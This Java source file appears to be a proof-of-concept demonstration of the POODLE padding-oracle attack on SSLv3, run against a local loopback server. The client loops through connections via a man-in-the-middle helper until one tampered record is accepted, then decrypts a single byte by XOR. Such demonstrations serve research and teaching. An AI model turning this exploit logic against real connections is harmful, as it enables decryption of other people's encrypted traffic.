import java.io.*;

import net.jumperz.security.*;
import net.jumperz.util.*;
import java.util.*;
import net.jumperz.net.*;

import java.security.GeneralSecurityException;
import java.security.cert.*;
import javax.net.ssl.*;

import javax.net.ServerSocketFactory;
import java.net.*;

public class MPoodle
{
static boolean success;
public static int data_count = 3;
//--------------------------------------------------------------------------------
public static void main( String[] args )
throws Exception
{
final Mitm dog = new Mitm( "127.0.0.1" );
new Thread(){
public void run()
{
dog.bite();
}
}.start();

InputStream certIn = MStreamUtil.getResourceStream( "cert.pem" );
InputStream keyIn  = MStreamUtil.getResourceStream( "key.pkcs8.der" );
ServerSocketFactory ssFactory = MSecurityUtil.getServerSocketFactory( certIn, keyIn, "RSA" );
certIn.close();
keyIn.close();

String addr = "127.0.0.1";

final SSLServerSocket sSocket = ( SSLServerSocket )ssFactory.createServerSocket( 443, 10, InetAddress.getByName( addr ) );
sSocket.setEnabledCipherSuites( new String[]{ "TLS_RSA_WITH_AES_128_CBC_SHA" } );
sSocket.setEnabledProtocols( new String[]{ "SSLv3" } );

new Thread(){
public void run()
{
try
	{
	while( !success )
		{
		final SSLSocket ss = ( SSLSocket )sSocket.accept();
		byte[] buf = new byte[ 100 ];
		
		try
			{
			int r = ss.getInputStream().read( buf );
			p( "received:" + r );
				{
				success = true;
				p( "==== OK ====" );
				}
			}
		catch( Exception se )
			{
			p( se );
			}
		finally
			{
			ss.close();
			}
		}
	}
catch( Exception e )
	{
	p( e );
	}
}
}.start();

final SSLSocketFactory factory = ( SSLSocketFactory )MSecurityUtil.getBogusSslSocketFactory();

while( !success )
	{
	Socket _socket = null;
	try
		{
		final SSLSocket s = ( SSLSocket )factory.createSocket();
		_socket = s;
		SocketAddress sockAddr = new InetSocketAddress( addr, 1443 );
		s.connect( sockAddr, 2000 );
		p( s );
	
		OutputStream out = s.getOutputStream();
		out.write( getByte( 12 + ( 16 * data_count ) ) );
		out.flush();

		MSystemUtil.sleep( 100 );
		out.close();
		}
	catch( SSLHandshakeException e )
		{
		e.printStackTrace();
		break;
		}
	catch( Exception e )
		{
		e.printStackTrace();
		p( e );
		}
	finally
		{
		_socket.close();
		}
	}

dog.shutdown();

http://developers.mobage.jp/blog/poodle
{ /* special thanks to Harupu */ }
	
byte A = dog.block4[ Mitm.BLOCKSIZE - 1 ];	//last byte of block 4
byte B = ( byte )0x0F;				// padding length = 15
byte C = ( byte )( ( int )A ^ ( int )B );	//C = A xor B
byte D = C;					//D = C
byte E = dog.block1[ Mitm.BLOCKSIZE - 1 ];	//last byte of block 1
byte F = ( byte )( ( int )E ^ ( int )D );

p( "Decrypted byte: " + F );
}
//--------------------------------------------------------------------------------
private static byte[] getByte( final int length )
{
final byte[] buf = new byte[ length ];
Arrays.fill( buf, ( byte )0x41 );
return buf;
}
//--------------------------------------------------------------------------------
public static void p( Object o )
{
System.out.println( o );
}
//--------------------------------------------------------------------------------
}